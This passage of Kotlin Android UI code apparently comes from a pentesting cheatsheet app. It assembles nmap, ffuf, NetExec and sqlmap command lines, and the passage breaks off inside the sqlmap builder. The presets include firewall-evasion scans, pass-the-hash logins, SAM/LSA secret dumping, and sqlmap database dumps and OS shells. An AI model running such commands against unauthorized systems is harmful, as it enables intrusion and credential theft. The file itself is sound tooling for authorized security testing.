package com.hackingcheatsheets.app.ui.components

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.widget.Toast
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.ExperimentalLayoutApi
import androidx.compose.foundation.layout.FlowRow
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Share
import androidx.compose.material3.FilterChip
import androidx.compose.material3.FilterChipDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.hackingcheatsheets.app.data.AppLanguage
import com.hackingcheatsheets.app.ui.theme.AccentBlue
import com.hackingcheatsheets.app.ui.theme.AccentPink
import com.hackingcheatsheets.app.ui.theme.AccentPurple
import com.hackingcheatsheets.app.ui.theme.BackgroundDark
import com.hackingcheatsheets.app.ui.theme.BorderDark
import com.hackingcheatsheets.app.ui.theme.CodeBlockBg
import com.hackingcheatsheets.app.ui.theme.CyberGreen
import com.hackingcheatsheets.app.ui.theme.ExploitRed
import com.hackingcheatsheets.app.ui.theme.SurfaceDark
import com.hackingcheatsheets.app.ui.theme.SurfaceVariantDark
import com.hackingcheatsheets.app.ui.theme.TerminalCyan
import com.hackingcheatsheets.app.ui.theme.TextMuted
import com.hackingcheatsheets.app.ui.theme.TextPrimary
import com.hackingcheatsheets.app.ui.theme.TextSecondary
import com.hackingcheatsheets.app.ui.theme.WarningOrange

enum class BuilderTool(val title: String, val category: String) {
    NMAP("Nmap", "Network Scanner"),
    FFUF("ffuf", "Web Fuzzer"),
    NETEXEC("NetExec", "Active Directory"),
    SQLMAP("SQLMap", "SQL Injection"),
    HASHCAT("Hashcat", "Hash Cracking"),
    MSFVENOM("Msfvenom", "Payload Generator"),
    HYDRA("Hydra", "Login Brute-Force"),
    LIGOLO_CHISEL("Ligolo / Chisel", "Pivoting")
}

@Composable
fun CommandBuilderView(
    language: AppLanguage,
    initialTool: BuilderTool = BuilderTool.NMAP,
    modifier: Modifier = Modifier
) {
    var selectedTool by remember { mutableStateOf(initialTool) }

    Column(modifier = modifier.fillMaxWidth()) {
        // Tool Selection Horizontal Carousel
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .horizontalScroll(rememberScrollState()),
            horizontalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            BuilderTool.values().forEach { tool ->
                val isSelected = selectedTool == tool
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(10.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(
                            1.dp,
                            if (isSelected) CyberGreen else BorderDark,
                            RoundedCornerShape(10.dp)
                        )
                        .clickable { selectedTool = tool }
                        .padding(horizontal = 12.dp, vertical = 7.dp)
                ) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Text(
                            text = tool.title,
                            fontSize = 12.sp,
                            fontFamily = FontFamily.Monospace,
                            fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Medium,
                            color = if (isSelected) CyberGreen else TextPrimary
                        )
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // Tool-specific builder content
        when (selectedTool) {
            BuilderTool.NMAP -> NmapBuilder(language)
            BuilderTool.FFUF -> FfufBuilder(language)
            BuilderTool.NETEXEC -> NetExecBuilder(language)
            BuilderTool.SQLMAP -> SqlmapBuilder(language)
            BuilderTool.HASHCAT -> HashcatBuilder(language)
            BuilderTool.MSFVENOM -> MsfvenomBuilder(language)
            BuilderTool.HYDRA -> HydraBuilder(language)
            BuilderTool.LIGOLO_CHISEL -> LigoloChiselBuilder(language)
        }
    }
}

// -------------------------------------------------------------
// LIVE COMMAND PREVIEW BOX COMPONENT
// -------------------------------------------------------------
@Composable
fun GeneratedCommandCard(
    command: String,
    language: AppLanguage,
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current

    Column(
        modifier = modifier
            .fillMaxWidth()
            .padding(top = 14.dp, bottom = 6.dp)
            .background(CodeBlockBg, RoundedCornerShape(10.dp))
            .border(1.dp, CyberGreen.copy(alpha = 0.5f), RoundedCornerShape(10.dp))
    ) {
        // Window Title Bar
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(SurfaceVariantDark, RoundedCornerShape(topStart = 10.dp, topEnd = 10.dp))
                .padding(horizontal = 12.dp, vertical = 6.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(modifier = Modifier.size(9.dp).clip(CircleShape).background(Color(0xFFFF5F56)))
                Spacer(modifier = Modifier.width(5.dp))
                Box(modifier = Modifier.size(9.dp).clip(CircleShape).background(Color(0xFFFFBD2E)))
                Spacer(modifier = Modifier.width(5.dp))
                Box(modifier = Modifier.size(9.dp).clip(CircleShape).background(Color(0xFF27C93F)))
                Spacer(modifier = Modifier.width(10.dp))
                Text(
                    text = if (language == AppLanguage.TR) "ÜRETİLEN KOMUT" else "GENERATED COMMAND",
                    fontSize = 11.sp,
                    fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold,
                    color = CyberGreen
                )
            }

            Row(verticalAlignment = Alignment.CenterVertically) {
                // Share
                IconButton(
                    onClick = {
                        val shareIntent = Intent().apply {
                            action = Intent.ACTION_SEND
                            putExtra(Intent.EXTRA_TEXT, command)
                            type = "text/plain"
                        }
                        context.startActivity(Intent.createChooser(shareIntent, "Share Command"))
                    },
                    modifier = Modifier.size(26.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.Share,
                        contentDescription = "Share",
                        tint = TextMuted,
                        modifier = Modifier.size(14.dp)
                    )
                }
                Spacer(modifier = Modifier.width(4.dp))
                // Copy
                IconButton(
                    onClick = {
                        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                        clipboard.setPrimaryClip(ClipData.newPlainText("Command", command))
                        Toast.makeText(context, if (language == AppLanguage.TR) "Komut kopyalandı!" else "Command copied!", Toast.LENGTH_SHORT).show()
                    },
                    modifier = Modifier.size(26.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.ContentCopy,
                        contentDescription = "Copy",
                        tint = CyberGreen,
                        modifier = Modifier.size(15.dp)
                    )
                }
            }
        }

        // Code Body
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .horizontalScroll(rememberScrollState())
                .padding(12.dp)
        ) {
            Text(
                text = command,
                color = TextPrimary,
                fontSize = 13.sp,
                fontFamily = FontFamily.Monospace,
                lineHeight = 19.sp
            )
        }
    }
}

// -------------------------------------------------------------
// 1. NMAP BUILDER
// -------------------------------------------------------------
@OptIn(ExperimentalLayoutApi::class)
@Composable
fun NmapBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.100") }
    var portsOption by remember { mutableStateOf("top1000") } // top1000, all, custom
    var customPorts by remember { mutableStateOf("80,443,8080,445") }
    var scanType by remember { mutableStateOf("-sS") } // -sS, -sT, -sU
    var enableVersionDetect by remember { mutableStateOf(true) }
    var enableDefaultScripts by remember { mutableStateOf(true) }
    var enableVulnScripts by remember { mutableStateOf(false) }
    var noPing by remember { mutableStateOf(true) } // -Pn
    var timing by remember { mutableStateOf("-T4") }
    var outputFile by remember { mutableStateOf("scan.txt") }
    var enableOutput by remember { mutableStateOf(false) }
    var enableDecoy by remember { mutableStateOf(false) }
    var fragmentPackets by remember { mutableStateOf(false) }

    // Presets
    val presets = if (language == AppLanguage.TR) listOf(
        "Hızlı Keşif" to 0,
        "Tam Port (-p-)" to 1,
        "Zafiyet & Script" to 2,
        "Güvenlik Duvarı Evasion" to 3,
        "UDP Tarama" to 4
    ) else listOf(
        "Quick Recon" to 0,
        "All Ports (-p-)" to 1,
        "Vuln & Scripts" to 2,
        "Firewall Evasion" to 3,
        "UDP Scan" to 4
    )

    Column {
        // Presets Chips
        Text(
            text = if (language == AppLanguage.TR) "HAZIR PROFİLLER" else "PRESET PROFILES",
            style = MaterialTheme.typography.bodySmall,
            color = TerminalCyan
        )
        Spacer(modifier = Modifier.height(4.dp))
        Row(
            modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()),
            horizontalArrangement = Arrangement.spacedBy(6.dp)
        ) {
            presets.forEach { (label, mode) ->
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(6.dp))
                        .background(SurfaceVariantDark)
                        .border(1.dp, BorderDark, RoundedCornerShape(6.dp))
                        .clickable {
                            when (mode) {
                                0 -> { // Quick
                                    portsOption = "top1000"
                                    scanType = "-sS"
                                    enableVersionDetect = true
                                    enableDefaultScripts = true
                                    enableVulnScripts = false
                                    noPing = true
                                    timing = "-T4"
                                    enableDecoy = false
                                    fragmentPackets = false
                                }
                                1 -> { // All ports
                                    portsOption = "all"
                                    scanType = "-sS"
                                    enableVersionDetect = true
                                    enableDefaultScripts = true
                                    enableVulnScripts = false
                                    noPing = true
                                    timing = "-T4"
                                }
                                2 -> { // Vuln
                                    portsOption = "top1000"
                                    scanType = "-sS"
                                    enableVersionDetect = true
                                    enableDefaultScripts = true
                                    enableVulnScripts = true
                                    noPing = true
                                    timing = "-T4"
                                }
                                3 -> { // Evasion
                                    portsOption = "top1000"
                                    scanType = "-sS"
                                    enableVersionDetect = false
                                    enableDefaultScripts = false
                                    enableVulnScripts = false
                                    noPing = true
                                    timing = "-T2"
                                    enableDecoy = true
                                    fragmentPackets = true
                                }
                                4 -> { // UDP
                                    portsOption = "top1000"
                                    scanType = "-sU"
                                    enableVersionDetect = true
                                    enableDefaultScripts = false
                                    enableVulnScripts = false
                                    noPing = true
                                    timing = "-T4"
                                }
                            }
                        }
                        .padding(horizontal = 8.dp, vertical = 5.dp)
                ) {
                    Text(text = label, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = TextPrimary)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))

        // Target Input
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text(if (language == AppLanguage.TR) "Hedef (IP / Domain / CIDR)" else "Target (IP / Host / CIDR)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = CyberGreen,
                unfocusedBorderColor = BorderDark,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary
            ),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(8.dp))

        // Ports row
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(6.dp)
        ) {
            listOf("top1000" to "--top-ports 1000", "all" to "-p- (65535)", "custom" to "Özel / Custom").forEach { (opt, lbl) ->
                val selected = portsOption == opt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(8.dp))
                        .background(if (selected) CyberGreen.copy(alpha = 0.15f) else SurfaceDark)
                        .border(1.dp, if (selected) CyberGreen else BorderDark, RoundedCornerShape(8.dp))
                        .clickable { portsOption = opt }
                        .padding(vertical = 8.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (selected) CyberGreen else TextSecondary)
                }
            }
        }

        if (portsOption == "custom") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = customPorts,
                onValueChange = { customPorts = it },
                label = { Text("Portlar (örn: 80,443,8080 veya 1-1000)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                ),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(8.dp))

        // Scan Type & Timing
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            // Scan Type
            listOf("-sS" to "SYN", "-sT" to "Connect", "-sU" to "UDP").forEach { (type, lbl) ->
                val selected = scanType == type
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (selected) TerminalCyan.copy(alpha = 0.15f) else SurfaceDark)
                        .border(1.dp, if (selected) TerminalCyan else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { scanType = type }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = "$type ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) TerminalCyan else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(8.dp))

        // Switches
        ToggleOption(label = "-sV (Servis / Versiyon Tespiti)", checked = enableVersionDetect, onCheckedChange = { enableVersionDetect = it })
        ToggleOption(label = "-sC (Varsayılan NSE Scriptleri)", checked = enableDefaultScripts, onCheckedChange = { enableDefaultScripts = it })
        ToggleOption(label = "--script=vuln (Bilinen Zafiyet Taraması)", checked = enableVulnScripts, onCheckedChange = { enableVulnScripts = it })
        ToggleOption(label = "-Pn (Ping Atlamadan Doğrudan Tara)", checked = noPing, onCheckedChange = { noPing = it })
        ToggleOption(label = "-f (Paketleri Parçala / Evasion)", checked = fragmentPackets, onCheckedChange = { fragmentPackets = it })
        ToggleOption(label = "-D RND:5 (Sahte IP Decoy)", checked = enableDecoy, onCheckedChange = { enableDecoy = it })
        ToggleOption(label = "-oN scan.txt (Çıktıyı Dosyaya Kaydet)", checked = enableOutput, onCheckedChange = { enableOutput = it })

        // Assemble Command
        val cmdParts = mutableListOf("nmap")
        cmdParts.add(scanType)
        if (enableVersionDetect) cmdParts.add("-sV")
        if (enableDefaultScripts) cmdParts.add("-sC")
        if (enableVulnScripts) cmdParts.add("--script=vuln")
        if (noPing) cmdParts.add("-Pn")
        if (fragmentPackets) cmdParts.add("-f")
        if (enableDecoy) cmdParts.add("-D RND:5")
        if (enableOutput) cmdParts.addAll(listOf("-oN", outputFile.trim()))

        when (portsOption) {
            "all" -> cmdParts.add("-p-")
            "custom" -> cmdParts.add("-p $customPorts")
            else -> {} // default top 1000
        }

        cmdParts.add(timing)
        cmdParts.add(target.trim())

        GeneratedCommandCard(
            command = cmdParts.joinToString(" "),
            language = language
        )
    }
}

// -------------------------------------------------------------
// 2. FFUF WEB FUZZER BUILDER
// -------------------------------------------------------------
@Composable
fun FfufBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("http://10.10.10.100/FUZZ") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt") }
    var extensions by remember { mutableStateOf(".php,.txt,.html") }
    var enableExtensions by remember { mutableStateOf(false) }
    var filterCodes by remember { mutableStateOf("404") }
    var useFilterCodes by remember { mutableStateOf(true) }
    var threads by remember { mutableStateOf("50") }
    var followRedirects by remember { mutableStateOf(true) }
    var useBurpProxy by remember { mutableStateOf(false) }

    // Presets
    val presets = if (language == AppLanguage.TR) listOf(
        "Dizin Keşfi" to 0,
        "Dosya Arama (.php,.txt)" to 1,
        "Subdomain Fuzzing" to 2,
        "Parametre Fuzzing" to 3
    ) else listOf(
        "Directory Enum" to 0,
        "File Search (.php,.txt)" to 1,
        "Subdomain Fuzz" to 2,
        "Parameter Fuzz" to 3
    )

    Column {
        Text(
            text = if (language == AppLanguage.TR) "HAZIR PROFİLLER" else "PRESET PROFILES",
            style = MaterialTheme.typography.bodySmall,
            color = TerminalCyan
        )
        Spacer(modifier = Modifier.height(4.dp))
        Row(
            modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()),
            horizontalArrangement = Arrangement.spacedBy(6.dp)
        ) {
            presets.forEach { (label, mode) ->
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(6.dp))
                        .background(SurfaceVariantDark)
                        .border(1.dp, BorderDark, RoundedCornerShape(6.dp))
                        .clickable {
                            when (mode) {
                                0 -> {
                                    url = "http://10.10.10.100/FUZZ"
                                    wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
                                    enableExtensions = false
                                }
                                1 -> {
                                    url = "http://10.10.10.100/FUZZ"
                                    wordlist = "/usr/share/wordlists/dirb/common.txt"
                                    extensions = ".php,.txt,.html,.bak"
                                    enableExtensions = true
                                }
                                2 -> {
                                    url = "http://FUZZ.target.com"
                                    wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
                                    enableExtensions = false
                                }
                                3 -> {
                                    url = "http://target.com/page.php?FUZZ=test"
                                    wordlist = "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
                                    enableExtensions = false
                                }
                            }
                        }
                        .padding(horizontal = 8.dp, vertical = 5.dp)
                ) {
                    Text(text = label, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = TextPrimary)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))

        OutlinedTextField(
            value = url,
            onValueChange = { url = it },
            label = { Text("Hedef URL (FUZZ anahtarı içermelidir)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = CyberGreen,
                unfocusedBorderColor = BorderDark,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary
            ),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(8.dp))

        OutlinedTextField(
            value = wordlist,
            onValueChange = { wordlist = it },
            label = { Text("Wordlist Yolu (-w)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = CyberGreen,
                unfocusedBorderColor = BorderDark,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary
            ),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(8.dp))

        ToggleOption(label = "-e Uzantı Ekle (Örn: .php,.txt)", checked = enableExtensions, onCheckedChange = { enableExtensions = it })
        if (enableExtensions) {
            OutlinedTextField(
                value = extensions,
                onValueChange = { extensions = it },
                label = { Text("Uzantılar (-e)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                ),
                singleLine = true
            )
            Spacer(modifier = Modifier.height(6.dp))
        }

        ToggleOption(label = "-r Yönlendirmeleri Takip Et (Follow Redirects)", checked = followRedirects, onCheckedChange = { followRedirects = it })
        ToggleOption(label = "-x Burp Suite Proxy (http://127.0.0.1:8080)", checked = useBurpProxy, onCheckedChange = { useBurpProxy = it })

        // Assemble ffuf command
        val cmdParts = mutableListOf("ffuf", "-u", url.trim(), "-w", wordlist.trim())
        if (enableExtensions && extensions.isNotBlank()) cmdParts.addAll(listOf("-e", extensions.trim()))
        if (useFilterCodes && filterCodes.isNotBlank()) cmdParts.addAll(listOf("-fc", filterCodes.trim()))
        if (followRedirects) cmdParts.add("-r")
        if (threads.isNotBlank()) cmdParts.addAll(listOf("-t", threads.trim()))
        if (useBurpProxy) cmdParts.addAll(listOf("-x", "http://127.0.0.1:8080"))

        GeneratedCommandCard(
            command = cmdParts.joinToString(" "),
            language = language
        )
    }
}

// -------------------------------------------------------------
// 3. NETEXEC (NXC) BUILDER
// -------------------------------------------------------------
@Composable
fun NetExecBuilder(language: AppLanguage) {
    var protocol by remember { mutableStateOf("smb") }
    var target by remember { mutableStateOf("192.168.1.0/24") }
    var username by remember { mutableStateOf("Administrator") }
    var authMode by remember { mutableStateOf("pass") } // pass, hash, null
    var password by remember { mutableStateOf("Password123!") }
    var ntlmHash by remember { mutableStateOf("aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0") }
    var localAuth by remember { mutableStateOf(false) }
    var selectedAction by remember { mutableStateOf("--shares") }

    Column {
        // Protocols
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("smb", "winrm", "ldap", "mssql", "ssh").forEach { proto ->
                val selected = protocol == proto
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (selected) AccentPurple.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (selected) AccentPurple else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { protocol = proto }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = proto.uppercase(), fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) AccentPurple else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))

        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Hedef (IP / Host / CIDR)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = CyberGreen,
                unfocusedBorderColor = BorderDark,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary
            ),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(8.dp))

        // Auth mode selector
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("pass" to "Parola (-p)", "hash" to "NTLM Hash (-H)", "null" to "Anonim / Null").forEach { (mode, lbl) ->
                val selected = authMode == mode
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (selected) CyberGreen.copy(alpha = 0.15f) else SurfaceDark)
                        .border(1.dp, if (selected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { authMode = mode }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (selected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(6.dp))

        if (authMode != "null") {
            OutlinedTextField(
                value = username,
                onValueChange = { username = it },
                label = { Text("Kullanıcı Adı (-u)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                ),
                singleLine = true
            )
            Spacer(modifier = Modifier.height(6.dp))
        }

        if (authMode == "pass") {
            OutlinedTextField(
                value = password,
                onValueChange = { password = it },
                label = { Text("Parola (-p)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                ),
                singleLine = true
            )
        } else if (authMode == "hash") {
            OutlinedTextField(
                value = ntlmHash,
                onValueChange = { ntlmHash = it },
                label = { Text("NTLM Hash (-H)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                ),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(8.dp))

        // Action / Module selection
        Text(
            text = if (language == AppLanguage.TR) "EYLEM & MODÜL" else "ACTION & MODULE",
            style = MaterialTheme.typography.bodySmall,
            color = TerminalCyan
        )
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "--shares" to "Paylaşımlar",
                "--users" to "Kullanıcılar",
                "--pass-pol" to "Parola Politikası",
                "--sam" to "SAM Hashleri",
                "--lsa" to "LSA Sırları",
                "--sessions" to "Oturumlar",
                "--rid-brute" to "RID Brute"
            ).forEach { (flag, lbl) ->
                val selected = selectedAction == flag
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (selected) AccentPurple.copy(alpha = 0.2f) else SurfaceVariantDark)
                        .border(1.dp, if (selected) AccentPurple else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { selectedAction = flag }
                        .padding(horizontal = 8.dp, vertical = 5.dp)
                ) {
                    Text(text = "$flag ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) AccentPurple else TextPrimary)
                }
            }
        }

        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--local-auth (Yerel Hesap Denetimi)", checked = localAuth, onCheckedChange = { localAuth = it })

        // Assemble NetExec command
        val cmdParts = mutableListOf("netexec", protocol, target.trim())
        when (authMode) {
            "pass" -> cmdParts.addAll(listOf("-u", "'$username'", "-p", "'$password'"))
            "hash" -> cmdParts.addAll(listOf("-u", "'$username'", "-H", "'$ntlmHash'"))
            "null" -> cmdParts.addAll(listOf("-u", "''", "-p", "''"))
        }
        if (localAuth) cmdParts.add("--local-auth")
        cmdParts.add(selectedAction)

        GeneratedCommandCard(
            command = cmdParts.joinToString(" "),
            language = language
        )
    }
}

// -------------------------------------------------------------
// 4. SQLMAP BUILDER
// -------------------------------------------------------------
@Composable
fun SqlmapBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("http://example.com/vuln.php?id=1") }
    var param by remember { mutableStateOf("id") }
    var levelRisk by remember { mutableStateOf("default") } // default, high, extreme
    var action by remember { mutableStateOf("--dbs") }
    var batchMode by remember { mutableStateOf(true) }
    var randomAgent by remember { mutableStateOf(true) }
    var useTamper by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(
            value = url,
            onValueChange = { url = it },
            label = { Text("Hedef URL (-u)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = CyberGreen,
                unfocusedBorderColor = BorderDark,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary
            ),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(8.dp))

        OutlinedTextField(
            value = param,
            onValueChange = { param = it },
            label = { Text("Hedef Parametre (-p)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = CyberGreen,
                unfocusedBorderColor = BorderDark,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary
            ),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(8.dp))

        // Level & Risk
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("default" to "Varsayılan (1/1)", "high" to "Yüksek (3/3)", "extreme" to "Agresif (5/3)").forEach { (lvl, lbl) ->
                val selected = levelRisk == lvl
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (selected) WarningOrange.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (selected) WarningOrange else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { levelRisk = lvl }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.5.sp, fontFamily = FontFamily.Monospace, color = if (selected) WarningOrange else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(8.dp))

        // Actions
        Text(
            text = if (language == AppLanguage.TR) "VERİ ÇEKME EYLEMİ" else "EXTRACTION ACTION",
            style = MaterialTheme.typography.bodySmall,
            color = TerminalCyan
        )
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "--dbs" to "Veritabanları",
                "--tables" to "Tablolar",
                "--columns" to "Sütunlar",
                "--dump" to "Tüm Verileri İndir",
                "--current-user" to "Mevcut Kullanıcı",
                "--os-shell" to "İnteraktif OS Shell",
                "--passwords" to "DBMS Parolaları"
            ).forEach { (act, lbl) ->
                val selected = action == act
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (selected) CyberGreen.copy(alpha = 0.15f) else SurfaceVariantDark)
                        .border(1.dp, if (selected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { action = act }
                        .padding(horizontal = 8.dp, vertical = 5.dp)
                ) {
                    Text(text = "$act ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) CyberGreen else TextPrimary)
                }
            }
        }

        Spacer(modifier = Modifier.height(6.dp))

        ToggleOption(label = "--batch (Soruları Otomatik Yanıtla)", checked = batchMode, onCheckedChange = { batchMode = it })
